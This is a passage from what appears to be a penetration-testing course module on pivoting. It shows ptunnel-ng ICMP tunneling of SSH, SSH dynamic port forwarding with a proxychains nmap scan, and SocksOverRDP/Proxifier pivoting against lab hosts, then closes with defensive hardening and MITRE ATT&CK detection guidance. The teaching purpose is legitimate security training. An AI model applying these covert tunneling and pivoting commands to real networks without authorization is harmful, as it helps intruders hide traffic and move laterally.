[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Dropping privileges now.</span>
</code></pre>
<p>The IP address following <code>-r</code> should be the IP we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking &amp; consideration during an actual engagement.</p>
<p>Back on the attack host, we can attempt to connect to the ptunnel-ng server (<code>-p &lt;ipAddressofTarget&gt;</code>) but ensure this happens through local port 2222 (<code>-l2222</code>). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.</p>
<p><strong>Connecting to ptunnel-ng Server from Attack Host</strong></p>
<p>ICMP Tunneling with SOCKS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Starting ptunnel-ng 1.42.</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">(c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">(c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Relaying packets from incoming TCP streams.</span>
</code></pre>
<p>With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (<code>-p2222</code>).</p>
<p><strong>Tunneling an SSH connection through an ICMP Tunnel</strong></p>
<p>ICMP Tunneling with SOCKS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh -p2222 -lubuntu <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>

ubuntu@<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>'s password: 
Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">20.04</span><span class="hljs-number">.3</span> LTS (GNU/Linux <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-91</span>-generic x86_64)

 * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span>
 * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span>
 * Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span>

  System information <span class="hljs-keyword">as</span> <span class="hljs-keyword">of</span> Wed <span class="hljs-number">11</span> May <span class="hljs-number">2022</span> <span class="hljs-number">03</span>:<span class="hljs-number">10</span>:<span class="hljs-number">15</span> PM UTC

  System load:             <span class="hljs-number">0.0</span>
  Usage <span class="hljs-keyword">of</span> /:              <span class="hljs-number">39.6</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">13.72</span>GB
  Memory usage:            <span class="hljs-number">37</span>%
  Swap usage:              <span class="hljs-number">0</span>%
  Processes:               <span class="hljs-number">183</span>
  Users logged <span class="hljs-keyword">in</span>:         <span class="hljs-number">1</span>
  IPv4 address <span class="hljs-keyword">for</span> ens192: <span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>
  IPv6 address <span class="hljs-keyword">for</span> ens192: dead:beef::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:feb9:<span class="hljs-number">52</span>eb
  IPv4 address <span class="hljs-keyword">for</span> ens224: <span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.129</span>

 * Super-optimized <span class="hljs-keyword">for</span> small spaces - read how we shrank the memory
   footprint <span class="hljs-keyword">of</span> MicroK8s <span class="hljs-keyword">to</span> make it the smallest full K8s around.

   https:<span class="hljs-comment">//ubuntu.com/blog/microk8s-memory-optimisation</span>

<span class="hljs-number">144</span> updates can be applied immediately.
<span class="hljs-number">97</span> <span class="hljs-keyword">of</span> these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed May <span class="hljs-number">11</span> <span class="hljs-number">14</span>:<span class="hljs-number">53</span>:<span class="hljs-number">22</span> <span class="hljs-number">2022</span> from <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.18</span>
ubuntu@WEB01:~$
</code></pre>
<p>If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.</p>
<p>On the client &amp; server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.</p>
<p><strong>Viewing Tunnel Traffic Statistics</strong></p>
<p>ICMP Tunneling with SOCKS</p>
<pre><code class="lang-shell-session">inf]: Incoming tunnel request from 10.10.14.18.
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Starting new session to 10.129.202.64:22 with ID 20199</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Received session close from remote peer.</span>
[<span class="hljs-symbol">inf</span>]: 
<span class="hljs-link">Session statistics:</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%</span>
[<span class="hljs-symbol">inf</span>]:<span class="hljs-link"></span>
</code></pre>
<p>We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.</p>
<p><strong>Enabling Dynamic Port Forwarding over SSH</strong></p>
<p>ICMP Tunneling with SOCKS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh -D <span class="hljs-number">9050</span> -p2222 -lubuntu <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>

ubuntu@<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span><span class="hljs-string">'s password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
&lt;snip&gt;</span>
</code></pre>
<p>We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.</p>
<p><strong>Proxychaining through the ICMP Tunnel</strong></p>
<p>ICMP Tunneling with SOCKS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains nmap -sV -<span class="hljs-built_in">sT</span> <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span> -p3389

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)
Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">11</span> <span class="hljs-number">11</span>:<span class="hljs-number">10</span> EDT
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">80</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">3389</span>-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;-<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>:<span class="hljs-number">3389</span>-&lt;&gt;&lt;&gt;-OK
Nmap scan report for <span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.19</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>12s latency).

PORT     STATE SERVICE       VERSION
<span class="hljs-number">3389</span>/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows<span class="hljs-comment">; CPE: cpe:/o:microsoft:windows</span>

Service detection performed. Please report any incorrect results <span class="hljs-meta">at</span> https://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">8.78</span> seconds
</code></pre>
<hr>
<h3 id="network-traffic-analysis-considerations">Network Traffic Analysis Considerations</h3>
<p>It is important that we confirm the tools we are using are performing as advertised and that we have set up &amp; are operating them properly. In the case of tunneling traffic through different protocols taught in this section with ICMP tunneling, we can benefit from analyzing the traffic we generate with a packet analyzer like <code>Wireshark</code>. Take a close look at the short clip below.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/analyzingTheTraffic.gif" alt=""></p>
<p>In the first part of this clip, a connection is established over SSH without using ICMP tunneling. We may notice that <code>TCP</code> &amp; <code>SSHv2</code> traffic is captured.</p>
<p>The command used in the clip: <code>ssh ubuntu@10.129.202.64</code></p>
<p>In the second part of this clip, a connection is established over SSH using ICMP tunneling. Notice the type of traffic that is captured when this is performed.</p>
<p>Command used in clip: <code>ssh -p2222 -lubuntu 127.0.0.1</code></p>
<h2 id="rdp-and-socks-tunneling-with-socksoverrdp">RDP and SOCKS Tunneling with SocksOverRDP</h2>
<hr>
<p>There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. <a href="https://github.com/nccgroup/SocksOverRDP">SocksOverRDP</a> is an example of a tool that uses <code>Dynamic Virtual Channels</code> (<code>DVC</code>) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use <code>SocksOverRDP</code> to tunnel our custom packets and then proxy through it. We will use the tool <a href="https://www.proxifier.com/">Proxifier</a> as our proxy server.</p>
<p>We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:</p>
<ol>
<li><a href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a></li>
<li><p><a href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></p>
</li>
<li><p>We can look for <code>ProxifierPE.zip</code></p>
</li>
</ol>
<p>We can then connect to the target using xfreerdp and copy the <code>SocksOverRDPx64.zip</code> file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.</p>
<p><strong>Loading SocksOverRDP.dll using regsvr32.exe</strong></p>
<p>RDP and SOCKS Tunneling with SocksOverRDP</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\S</span>ocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/158/socksoverrdpdll.png" alt=""></p>
<p>Now we can connect to 172.16.5.19 over RDP using <code>mstsc.exe</code>, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials <code>victor:pass@123</code> to connect to 172.16.5.19.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/pivotingtoDC.png" alt=""></p>
<p>We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/executingsocksoverrdpserver.png" alt=""></p>
<p>When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.</p>
<p><strong>Confirming the SOCKS Listener is Started</strong></p>
<p>RDP and SOCKS Tunneling with SocksOverRDP</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\S</span>ocksOverRDP-x64&gt; netstat -antb | findstr 1080

  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
</code></pre>
<p>After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. See the clip below for a quick walkthrough of configuring Proxifier.</p>
<p><strong>Configuring Proxifier</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/configuringproxifier.gif" alt=""></p>
<p>With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/rdpsockspivot.png" alt=""></p>
<p><strong>RDP Performance Considerations</strong></p>
<p>When interacting with our RDP sessions on an engagement, we may find ourselves contending with slow performance in a given session, especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the <code>Experience</code> tab in mstsc.exe and set <code>Performance</code> to <code>Modem</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/rdpexpen.png" alt=""></p>
<h2 id="detection-prevention">Detection &amp; Prevention</h2>
<hr>
<p>Throughout this module, we have mastered several different techniques that can be used from an <code>offensive perspective</code>. As penetration testers, we should also be concerned with the mitigations and detections that can be put in place to aid defenders in stopping these types of TTP&#39;s. This is crucial since we are expected to provide our customers with potential fixes or solutions to the issues we find and exploit during our assessments. Some may be:</p>
<ul>
<li>Physical hardware changes</li>
<li>Changes to the network infrastructure</li>
<li>Modifications to host baselines</li>
</ul>
<p>This section will cover some of these fixes and what they mean for us and those in charge of defending the network.</p>
<hr>
<h3 id="setting-a-baseline">Setting a Baseline</h3>
<p>Understanding everything present and happening in a network environment is vital. As defenders, we should be able to quickly <code>identify</code> and <code>investigate</code> any new hosts that appear in our network, any new tools or applications that get installed on hosts outside of our application catalog, and any new or unique network traffic generated. An audit of everything listed below should be done annually, if not every few months, to ensure your records are up to date. Among some of the considerations we can start with are:</p>
<p><strong>Things to Document and Track</strong></p>
<ul>
<li>DNS records, network device backups, and DHCP configurations</li>
<li>Full and current application inventory</li>
<li>A list of all enterprise hosts and their location</li>
<li>Users who have elevated permissions</li>
<li>A list of any dual-homed hosts (More than one network interface)</li>
<li>Keeping a visual network diagram of your environment</li>
</ul>
<p>Along with tracking the items above, keeping a visual network diagram of your environment up-to-date can be highly effective when troubleshooting issues or responding to an incident. <a href="https://www.netbraintech.com/">Netbrain</a> is an excellent example of one tool that can provide this functionality and interactive access to all appliances in the diagram. If we want a way to document our network environment visually, we can use a free tool like <a href="https://app.diagrams.net/">diagrams.net</a>. Lastly, for our baseline, understanding what assets are critical to the operation of your organization and monitoring those assets is a must.</p>
<hr>
<h3 id="people-processes-and-technology">People, Processes, and Technology</h3>
<p>Network hardening can be organized into the categories <em>People</em>, <em>Process,</em> and <em>Technology</em>. These hardening measures will encompass the hardware, software, and human aspects of any network. Let&#39;s start with the <code>human</code> (<code>People</code>) aspect.</p>
<h4 id="people">People</h4>
<p>In even the most hardened environment, users are often considered the weakest link. Enforcing security best practices for standard users and administrators will prevent &quot;easy wins&quot; for pentesters and malicious attackers. We should also strive to keep ourselves and the users we serve educated and aware of threats. The measures below are a great way to begin the process of securing the human element of any enterprise environment.</p>
<h4 id="byod-and-other-concerns">BYOD and Other Concerns</h4>
<p>Bring Your Own Device (BYOD) is becoming prevalent in today&#39;s workforce. With the increased acceptance of remote work and hybrid work arrangements, more people are using their personal devices to perform work-related tasks. This presents unique risks to organizations because their employees may be connecting to networks and shared resources owned by the organization. The organization has a limited ability to administer and secure a personally owned device such as a laptop or smartphone, leaving the responsibility of securing the device largely with the owner. If the device owner follows poor security practices, they not only put themselves at risk of compromise, but now they can also extend these same risks to their employers. Consider the practical example below to build perspective on this:</p>
<p>Scenario: Nick is a hardworking and dedicated logistics manager for Inlanefreight. He has put in a lot of great work over the years, and the company trusts him enough to allow him to work from home three days out of the week. Like many Inlanefreight employees, Nick also takes advantage of Inlanefreight&#39;s willingness to allow employees to use their own devices for work-related tasks at home and in the office network environments. Nick also enjoys gaming and sometimes illegally torrents video games. One game he downloaded and installed also installed malware that gave an attacker remote access to his laptop. When Nick goes into the office, he connects to the WiFi network that extends access to the employee network. Anyone can reach the Domain Controllers, File Shares, printers, and other important network resources from this network. Because there is malware on Nick&#39;s system, the attacker also has access to these network resources and can attempt to pivot across Inlanefreight&#39;s network due to Nick&#39;s bad security practices on his personal computer.</p>
<p>Using <code>multi-factor authentication</code> (Something you have, something you know, something you are, location, etc.) are all excellent factors to consider when implementing authentication mechanisms. Implementing two or more factors for authentication (especially for administrative accounts and access) is a great way to make it more difficult for an attacker to gain full access to an account should a user&#39;s password or hash get compromised.</p>
<p>Along with ensuring your users cannot cause harm, we should consider our policies and procedures for domain access and control. Larger organizations should also consider building a Security Operation Center (SOC) team or use a <code>SOC as a Service</code> to constantly monitor what is happening within the IT environment 24/7. Modern defensive technologies have come a long way and can help with many different defensive tactics, but we need human operators to ensure they function as they are supposed to. <code>Incident response</code> is something where we can&#39;t yet completely automate out the human element. So having a proper <code>incident response plan</code> ready is essential to be prepared for a breach.</p>
<hr>
<h4 id="processes">Processes</h4>
<p>Maintaining and enforcing policies and procedures can significantly impact an organization&#39;s overall security posture. It is near impossible to hold an organization&#39;s employees accountable without defined policies. It makes it challenging to respond to an incident without defined and practiced procedures such as a <code>disaster recovery plan</code>. The items below can help to start defining an organization&#39;s <code>processes</code>, <code>policies</code>, and <code>procedures</code> relating to securing their users &amp; network environment.</p>
<ul>
<li>Proper policies and procedures for asset monitoring and management<ul>
<li>Host audits, the use of asset tags, and periodic asset inventories can help ensure hosts are not lost</li>
</ul>
</li>
<li>Access control policies (user account provisioning/de-provisioning), multi-factor authentication mechanisms</li>
<li>Processes for provisioning and decommissioning hosts (i.e., baseline security hardening guideline, gold images)</li>
<li>Change management processes to formally document <code>who did what</code> and <code>when they did it</code></li>
</ul>
<h4 id="technology">Technology</h4>
<p>Periodically check the network for legacy misconfigurations and new &amp; emerging threats. As changes are made to an environment, ensure that common misconfigurations are not introduced while paying attention to any vulnerabilities introduced by tools or applications utilized in the environment. If possible, attempt to patch or mitigate those risks with the understanding that the CIA triad is a balancing act, and the acceptance of the risk a vulnerability presents may be the best option for your environment.</p>
<hr>
<h3 id="from-the-outside-moving-in">From the Outside Moving In</h3>
<p>When working with an organization to help them assess the security posture of their environment, it can be helpful to start from the outside and move our way in. As penetration testers and security practitioners, we want our clients to take our findings and recommendations seriously enough to inform their decisions moving forward. We want them to understand that the issues we uncover can also be found by individuals or groups with less honorable intentions. Let&#39;s consider this through a mental exercise using the outline below. Feel free to use these burning questions and considerations to start a conversation with friends, team-members or if you are alone, take some notes and come up with the most secure design you can think of:</p>
<p><strong>Perimeter First</strong></p>
<ul>
<li><code>What exactly are we protecting?</code></li>
<li><code>What are the most valuable assets the organization owns that need securing?</code></li>
<li><code>What can be considered the perimeter of our network?</code></li>
<li><code>What devices &amp; services can be accessed from the Internet? (Public-facing)</code></li>
<li><code>How can we detect &amp; prevent when an attacker is attempting an attack?</code></li>
<li><code>How can we make sure the right person &amp;/or team receives alerts as soon as something isn&#39;t right?</code></li>
<li><code>Who on our team is responsible for monitoring alerts and any actions our technical controls flag as potentially malicious?</code></li>
<li><code>Do we have any external trusts with outside partners?</code></li>
<li><code>What types of authentication mechanisms are we using?</code></li>
<li><code>Do we require Out-of-Band (OOB) management for our infrastructure. If so, who has access permissions?</code></li>
<li><code>Do we have a Disaster Recovery plan?</code></li>
</ul>
<p>When considering these questions regarding the perimeter, we may face the reality that an organization has infrastructure that could be based on premises &amp;/or in the cloud. Most organizations in the modern day operate hybrid-cloud infrastructures. This means some of the technologies used by organizations may be running on network &amp; server infrastructure owned by the organization, and some may be hosted by a 3rd party cloud provider (AWS, Azure, GCP, etc.).</p>
<ul>
<li>External interface on a firewall<ul>
<li>Next-Gen Firewall Capabilities<ul>
<li>Blocking suspicious connections by IP</li>
<li>Ensuring only approved individuals are connecting to VPNs</li>
<li>Building the ability to quick disconnect suspicious connections without disrupting business functions</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<p><strong>Internal Considerations</strong></p>
<p>Many of the questions we ask for external considerations apply to our internal environment. There are a few differences; however, there are many different routes for ensuring the successful defense of our networks. Let&#39;s consider the following:</p>
<ul>
<li><code>Are any hosts that require exposure to the internet properly hardened and placed in a DMZ network?</code></li>
<li><code>Are we using Intrusion Detection and Prevention systems within our environment?</code></li>
<li><code>How are our networks configured? Are different teams confined to their own network segments?</code></li>
<li><code>Do we have separate networks for production and management networks?</code></li>
<li><code>How are we tracking approved employees who have remote access to admin/management networks?</code></li>
<li><code>How are we correlating the data we are receiving from our infrastructure defenses and end-points?</code></li>
<li><code>Are we utilizing host-based IDS, IPS, and event logs?</code></li>
</ul>
<p>Our best chance of spotting, stopping, and potentially even preventing an attack often depends on our ability to maintain visibility within our environment. A proper SIEM implementation to correlate and analyze our host and infrastructure logs can go a long way. Combine that with adequate network segmentation, and it becomes infinitely more challenging for an attacker to gain a foothold and pivot to targets. Simple things like ensuring Steve from HR cannot view or access network infrastructure such as switches and routers or admin panels for internal websites can prevent the use of standard users for lateral movement.</p>
<hr>
<h3 id="mitre-breakdown">MITRE Breakdown</h3>
<p>As a different look at this, we have broken down the major actions we practice in this module and mapped controls based on the TTP and a MITRE tag. Each tag corresponds with a section of the <a href="https://attack.mitre.org/tactics/enterprise/">Enterprise ATT\&amp;CK Matrix</a> found here. Any tag marked as <code>TA</code> corresponds to an overarching tactic, while a tag marked as <code>T###</code> is a technique found in the matrix under tactics.</p>
<table data-header-hidden><thead><tr><th width="130"></th><th width="115"></th><th></th></tr></thead><tbody><tr><td><strong>TTP</strong></td><td><strong>MITRE Tag</strong></td><td><strong>Description</strong></td></tr><tr><td><code>External Remote Services</code></td><td>T1133</td><td>We have options for prevention when dealing with the use of External Remote Services. <code>First</code>, having a proper firewall in place to segment our environment from the rest of the Internet and control the flow of traffic is a must. <code>Second</code>, disabling and blocking any internal traffic protocols from reaching out to the world is always a good practice. <code>Third</code>, using a VPN or some other mechanism that requires a host to be <code>logically</code> located within the network before it gains access to those services is a great way to ensure you aren&#39;t leaking data you shouldn&#39;t.</td></tr><tr><td><code>Remote Services</code></td><td>T1021</td><td>Multi-factor authentication can go a long way when trying to mitigate the unauthorized use of remote services such as SSH and RDP. Even if a user&#39;s password was taken, the attacker would still need a way to acquire the string from their MFA of choice. Limiting user accounts with remote access permissions and separating duties as to who can remotely access what portions of a network can go a long way. Utilizing your networked firewall and the built-in firewall on your hosts to limit incoming/outgoing connections for remote services is an easy win for defenders. It will stop the connection attempt unless it is from an authorized internal or external network. When dealing with infrastructure devices such as routers and switches, only exposing remote management services and ports to an Out Of Band (OOB network is a best practice that should always be followed. Doing this ensures that anyone who may have compromised the enterprise networks cannot simply hop from a regular user&#39;s host into the infrastructure.</td></tr><tr><td><code>Use of Non-Standard Ports</code></td><td>T1571</td><td>This technique can be a tricky one to catch. Attackers will often use a common protocol such as <code>HTTP</code> or <code>HTTPS</code> to communicate with your environment. It is hard to see what is going on, especially with the use of HTTPS, but the pairings of protocols such as these with a non-standard port ( 44<code>4</code> instead of 44<code>3</code>, for example) can tip us off to something suspicious happening. Attackers will often try to work in this manner, so having a solid <code>baseline</code> of what ports/protocols are commonly used in your environment can go a long way when trying to spot the bad. Using some form of a Network Intrusion Prevention or Detection system can also help spot and shut down the potentially malicious traffic.</td></tr><tr><td><code>Protocol Tunneling</code></td><td>T1572</td><td>This is an interesting problem to tackle. Many actors utilize protocol tunneling to hide their communications channels. Often we will see things much like we practiced in this module (tunneling other traffic through an SSH tunnel) and even the use of protocols like DNS to pass instructions from external sources to a host internal to the network. Taking the time to lock down what ports and protocols are allowed to talk in/out of your networks is a must. If you have a domain running and are hosting a DC &#x26; DNS server, your hosts should have no reason to reach externally for name resolution. Disallowing DNS resolution from the web (except to specific hosts like the DNS server) can help with an issue such as this. Having a good monitoring solution in place can also watch for traffic patterns and what is known as <code>Beaconing</code>. Even if the traffic is encrypted, we may possibly see requests happening in a pattern over time. This is a common trait of a C2 channel.</td></tr><tr><td><code>Proxy Use</code></td><td>T1090</td><td>The use of a Proxy point is commonplace among threat actors. Many will use a proxy point or distribute their traffic over multiple hosts so that they do not directly expose their infrastructure. By using a proxy, there is no direct connection from the victim&#39;s environment to the attacker&#39;s host at any given time. The detection and prevention of proxy use is a bit difficult as it takes an intimate knowledge of common net flow within your environment. The most effective route is maintaining a list of allowed/blocked domains and IP addresses. Anything not explicitly allowed will be blocked until you let the traffic through.</td></tr><tr><td><code>LOTL</code></td><td>N/A</td><td>It can be hard to spot an attacker while they are utilizing the resources on hand. This is where having a baseline of network traffic and user behavior comes in handy. If your defenders understand what the day-to-day normal for their network looks like, you have a chance to spot the abnormal. Watching for command shells and utilizing a properly configured EDR and AV solution will go a long way to providing you visibility. Having some form of networking monitoring and logging feeding into a common system like a SIEM which defenders check, will go a long way to seeing an attack in the initial stages instead of after the fact.</td></tr></tbody></table>